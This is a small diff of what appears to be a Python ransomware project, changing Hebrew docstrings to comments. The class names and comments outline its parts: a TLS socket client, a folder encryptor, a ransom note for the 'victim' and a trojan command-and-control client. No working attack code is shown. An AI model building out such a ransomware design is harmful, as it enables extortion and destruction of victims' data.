@@ -9,7 +9,7 @@ import protocol
 
 
 class SecureSocketClient:
-    """מחלקה שאחראית רק על יצירת socket עם TLS"""
+    # מחלקה שאחראית רק על יצירת socket עם TLS
 
     def __init__(self, host, port):
         self.host = host
@@ -25,7 +25,7 @@ class SecureSocketClient:
 
 
 class FileEncryptor:
-    """אחראי על הצפנה ופענוח של קבצים"""
+    # אחראי על הצפנה ופענוח של קבצים
 
     @staticmethod
     def encrypt_folder(folder_path, aes_key):
@@ -75,7 +75,7 @@ class FileEncryptor:
 
 
 class RansomNote:
-    """אחראי על הצגת הודעות לקורבן"""
+    # אחראי על הצגת הודעות לקורבן
 
     @staticmethod
     def display_encryption_note():
@@ -101,7 +101,7 @@ class RansomNote:
 
 
 class TrojanClient:
-    """מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול"""
+    # מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול
 
     def __init__(self, host, port, folder):
         self.folder = folder
